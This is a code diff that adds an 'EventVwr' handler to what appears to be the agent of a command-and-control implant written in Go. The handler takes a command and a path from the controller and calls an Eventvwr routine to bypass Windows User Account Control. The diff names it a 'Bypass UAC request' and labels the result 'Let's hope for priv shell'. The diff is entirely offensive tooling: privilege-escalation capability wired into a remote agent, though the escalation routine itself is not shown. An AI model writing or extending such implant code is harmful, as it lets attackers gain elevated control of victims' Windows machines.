@@ -681,9 +681,40 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 				returnMessage.Payload = fileTransferMessage
 				return returnMessage, nil
 			}
+		case "EventVwr":
+			if a.Verbose {
+				message("note", "Received Bypass UAC request")
+			}
+
+			//ensure the provided args are valid
+			if len(p.Args) < 2 {
+				//not enough args
+				c.Stderr = "not enough arguments provided to the Bypass UAC"
+				break
+			}
+			command_exec := p.Args[0]
+
+			abs_Path := p.Args[1]
+
+			// Get bypass UAC eventvwr
+			event_Err := Eventvwr(command_exec, abs_Path)
+			if event_Err != nil {
+				c.Stderr = fmt.Sprintf("There was an error executing the Bypass UAC EventVwr module:\r\n%s",
+				event_Err.Error())
+			}
+			returnMessage.Type = "Let's hope for priv shell"
+			returnMessage.Payload = nil
+
+				return returnMessage, nil
+			
 		default:
 			c.Stderr = fmt.Sprintf("%s is not a valid module type", p.Command)
 		}
+		
+	
+		
+
+	
 	case "AgentControl":
 		if a.Verbose {
 			message("note", "Received Agent Control Message")
